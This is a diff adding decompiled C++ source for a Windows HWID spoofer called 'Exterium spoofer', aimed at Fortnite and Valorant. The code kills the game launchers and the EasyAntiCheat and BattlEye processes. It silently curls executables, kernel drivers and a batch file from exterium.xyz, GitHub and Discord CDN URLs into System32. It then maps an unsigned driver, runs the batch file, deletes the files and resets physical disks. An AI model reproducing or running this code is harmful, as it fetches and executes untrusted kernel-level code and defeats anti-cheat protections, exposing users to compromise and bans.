@@ -1,0 +1,212 @@
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  HWND ConsoleWindow; // rbx
+  LONG WindowLongA; // eax
+  HWND Window; // rax
+  const CHAR *v6; // rcx
+  __int64 perf_frequency; // rbx
+  __int64 perf_counter; // rax
+  __int64 v9; // rdi
+  __int64 v10; // rbx
+  __int64 v11; // rax
+  __int64 v12; // rbx
+  __int64 v13; // rdx
+  __int64 v14; // rax
+  double v15; // xmm0_8
+  int v16; // ecx
+  __int64 v17; // rax
+  __int64 v18; // rdx
+  unsigned __int64 v19; // rdx
+  HANDLE StdHandle; // rbx
+  __int64 v21; // rax
+  __int64 v22; // rax
+  __int64 v23; // rax
+  __int64 v24; // rax
+  __int64 v25; // rax
+  __int64 v26; // rax
+  __int64 v27; // rax
+  __int64 v28; // rax
+  CHAR *v29; // rcx
+  int v31; // [rsp+20h] [rbp-58h] BYREF
+  xtime v32; // [rsp+28h] [rbp-50h] BYREF
+  LPCSTR lpConsoleTitle[3]; // [rsp+38h] [rbp-40h] BYREF
+  unsigned __int64 v34; // [rsp+50h] [rbp-28h]
+
+  ConsoleWindow = GetConsoleWindow();
+  WindowLongA = GetWindowLongA(ConsoleWindow, -20);
+  SetWindowLongA(ConsoleWindow, -20, WindowLongA | 0x80000);
+  SetLayeredWindowAttributes(ConsoleWindow, 0, 0xE5u, 2u);
+  Window = FindWindowExA(ConsoleWindow, 0i64, "ConsoleWindowClass", 0i64);
+  SetLayeredWindowAttributes(Window, 0, 0xFFu, 2u);
+  system("taskkill /f /im epicgameslauncher.exe > nul");
+  system("cls");
+  system("taskkill /f /im EpicWebHelper.exe > nul");
+  system("cls");
+  system("taskkill /f /im FortniteClient-Win64-Shipping_EAC.exe > nul");
+  system("cls");
+  system("taskkill /f /im FortniteClient-Win64-Shipping_BE.exe > nul");
+  system("cls");
+  system("taskkill /f /im FortniteLauncher.exe > nul");
+  system("cls");
+  system("taskkill /f /im FortniteClient-Win64-Shipping.exe > nul");
+  system("cls");
+  system("taskkill /f /im EpicGamesLauncher.exe > nul");
+  system("cls");
+  system("taskkill /f /im EasyAntiCheat.exe > nul");
+  system("cls");
+  system("taskkill /f /im BEService.exe > nul");
+  system("cls");
+  system("taskkill /f /im BEServices.exe > nul");
+  system("cls");
+  system("taskkill /f /im BattleEye.exe > nul");
+  system("cls");
+  system("taskkill /f /im RiotClientServices.exe > nul");
+  system("cls");
+  system("taskkill /f /im RiotClientUxRender.exe > nul");
+  system("cls");
+  system("taskkill /f /im riotclientservices.exe > nul");
+  system("cls");
+  system("taskkill /f /im VALORANT-Win64-Shipping.exe > nul");
+  sub_1400011C0(lpConsoleTitle);
+  v6 = (const CHAR *)lpConsoleTitle;
+  if ( v34 >= 0x10 )
+    v6 = lpConsoleTitle[0];
+  SetConsoleTitleA(v6);
+  perf_frequency = Query_perf_frequency();
+  perf_counter = Query_perf_counter();
+  if ( perf_frequency == 10000000 )
+    v9 = 100 * perf_counter;
+  else
+    v9 = 1000000000 * (perf_counter % perf_frequency) / perf_frequency + 1000000000 * (perf_counter / perf_frequency);
+  while ( 1 )
+  {
+    v10 = Query_perf_frequency();
+    v11 = Query_perf_counter();
+    v12 = v10 == 10000000 ? 100 * v11 : 1000000000 * (v11 % v10) / v10 + 1000000000 * (v11 / v10);
+    if ( v12 >= v9 )
+      break;
+    v13 = 100 * Xtime_get_ticks();
+    v14 = v9 - v12;
+    v15 = (double)((int)v9 - (int)v12);
+    v16 = v13 - 1391067136;
+    if ( v15 <= 8.64e14 )
+      v16 = v13 + v14;
+    v17 = v13 + v14;
+    v18 = v13 + 864000000000000i64;
+    if ( v15 <= 8.64e14 )
+      v18 = v17;
+    v19 = (__int64)((unsigned __int128)(v18 * (__int128)0x112E0BE826D694B3i64) >> 64) >> 26;
+    v32.sec = (v19 >> 63) + v19;
+    v32.nsec = v16 - 1000000000 * LODWORD(v32.sec);
+    Thrd_sleep(&v32);
+  }
+  do
+  {
+    system("cls");
+    sub_140001B00(std::cout, "Exterium spoofer | exterium.xyz | Im still standing\n\n");
+    StdHandle = GetStdHandle(0xFFFFFFF5);
+    SetConsoleTextAttribute(StdHandle, 0xFu);
+    sub_140001B00(std::cout, "[ ");
+    SetConsoleTextAttribute(StdHandle, 9u);
+    sub_140001B00(std::cout, "1 ");
+    SetConsoleTextAttribute(StdHandle, 0xFu);
+    v21 = sub_140001B00(std::cout, "] Spoof NovaFN (Temporary)");
+    std::basic_ostream<char,std::char_traits<char>>::operator<<(v21, sub_140001CD0);
+    SetConsoleTextAttribute(StdHandle, 0xFu);
+    sub_140001B00(std::cout, "[ ");
+    SetConsoleTextAttribute(StdHandle, 9u);
+    sub_140001B00(std::cout, "2 ");
+    SetConsoleTextAttribute(StdHandle, 0xFu);
+    v22 = sub_140001B00(std::cout, "] Spoof NovaFN (Permanent)");
+    std::basic_ostream<char,std::char_traits<char>>::operator<<(v22, sub_140001CD0);
+    SetConsoleTextAttribute(StdHandle, 0xFu);
+    sub_140001B00(std::cout, "[ ");
+    SetConsoleTextAttribute(StdHandle, 9u);
+    sub_140001B00(std::cout, "3 ");
+    SetConsoleTextAttribute(StdHandle, 0xFu);
+    v23 = sub_140001B00(
+            std::cout,
+            "] Clean NovaFN (verify yourself in the server, then download it in #Novafn-cleaner)");
+    std::basic_ostream<char,std::char_traits<char>>::operator<<(v23, sub_140001CD0);
+    SetConsoleTextAttribute(StdHandle, 0xFu);
+    v24 = sub_140001B00(std::cout, "\n\nSelection:");
+    std::basic_ostream<char,std::char_traits<char>>::operator<<(v24, sub_140001CD0);
+    std::basic_istream<char,std::char_traits<char>>::operator>>(std::cin, &v31);
+    switch ( v31 )
+    {
+      case 1:
+        system("cls");
+        v27 = sub_140001B00(std::cout, "Spoofing NovaFN Temporary...");
+        std::basic_ostream<char,std::char_traits<char>>::operator<<(v27, sub_140001CD0);
+        system(
+          "curl --silent https://www.exterium.xyz/assetsV2/EA%20Sports/ValoMapper.exe --output C:\\Windows\\System32\\Val"
+          "oMapper.exe >nul 2>&1");
+        system(
+          "curl --silent https://github.com/SoarDevelopment/Spoof-Driver/raw/main/soardrv.sys --output C:\\Windows\\Syste"
+          "m32\\eac.sys >nul 2>&1");
+        system("cd C:\\Windows\\System32\\ && ValoMapper.exe eac.sys");
+        system("cls");
+        system("del /f C:\\Windows\\System32\\ValoMapper.exe");
+        system("del /f C:\\Windows\\System32\\eac.sys");
+        system("powershell.exe  Reset - PhysicalDisk* > nul 2 > &1");
+        system("cls");
+        v28 = sub_140001B00(std::cout, "Done!");
+        std::basic_ostream<char,std::char_traits<char>>::operator<<(v28, sub_140001CD0);
+        break;
+      case 2:
+        system("cls");
+        v26 = sub_140001B00(std::cout, "Spoofing NovaFN Permanently...");
+        std::basic_ostream<char,std::char_traits<char>>::operator<<(v26, sub_140001CD0);
+        system(
+          "curl --silent https://cdn.discordapp.com/attachments/1138525550198132909/1150107556136615956/UCORESYS.SYS --ou"
+          "tput C:\\Windows\\System32\\UCORESYS.SYS >nul 2>&1");
+        system(
+          "curl --silent https://cdn.discordapp.com/attachments/1138525550198132909/1150107556472180867/UCOREVXD.VXD --ou"
+          "tput C:\\Windows\\System32\\UCOREVXD.VXD >nul 2>&1");
+        system(
+          "curl --silent https://cdn.discordapp.com/attachments/1138525550198132909/1150107556795125780/UCOREW64.SYS --ou"
+          "tput C:\\Windows\\System32\\UCOREW64.SYS >nul 2>&1");
+        system(
+          "curl --silent https://cdn.discordapp.com/attachments/1138525550198132909/1150107557151657997/UCOREDLL.DLL --ou"
+          "tput C:\\Windows\\System32\\UCOREDLL.DLL >nul 2>&1");
+        system(
+          "curl --silent https://cdn.discordapp.com/attachments/1138525550198132909/1150107570565021799/AMIDEWINx64.EXE -"
+          "-output C:\\Windows\\System32\\AMIDEWINx64.EXE >nul 2>&1");
+        system(
+          "curl --silent https://cdn.discordapp.com/attachments/1138525550198132909/1150107570900586547/amifldrv64.sys --"
+          "output C:\\Windows\\System32\\amifldrv64.sys >nul 2>&1");
+        system(
+          "curl --silent https://cdn.discordapp.com/attachments/1138525550198132909/1150107571269664850/DMI16.EXE --outpu"
+          "t C:\\Windows\\System32\\DMI16.EXE  >nul 2>&1");
+        system(
+          "curl --silent https://cdn.discordapp.com/attachments/1138525550198132909/1150107571575869470/AMIDEWIN.EXE --ou"
+          "tput C:\\Windows\\System32\\AMIDEWIN.EXE >nul 2>&1");
+        system(
+          "curl --silent https://cdn.discordapp.com/attachments/1138525550198132909/1150147342645870613/sugma.bat --outpu"
+          "t C:\\Windows\\System32\\sugma.bat >nul 2>&1");
+        system("cd C:\\Windows\\System32");
+        system("cd C:\\Windows\\System32\\ && sugma.bat");
+        system("powershell.exe  Reset - PhysicalDisk* > nul 2 > &1");
+        break;
+      case 3:
+        system("cls");
+        v25 = sub_140001B00(std::cout, "Cleaning Nova...");
+        std::basic_ostream<char,std::char_traits<char>>::operator<<(v25, sub_140001CD0);
+        system("start https://discord.gg/rlbmods");
+        break;
+    }
+  }
+  while ( v31 );
+  if ( v34 >= 0x10 )
+  {
+    v29 = (CHAR *)lpConsoleTitle[0];
+    if ( v34 + 1 >= 0x1000 )
+    {
+      v29 = (CHAR *)*((_QWORD *)lpConsoleTitle[0] - 1);
+      if ( (unsigned __int64)(lpConsoleTitle[0] - (LPCSTR)v29 - 8) > 0x1F )
+        invalid_parameter_noinfo_noreturn();
+    }
+    j_j_free(v29);
+  }
+  return 0;
+}
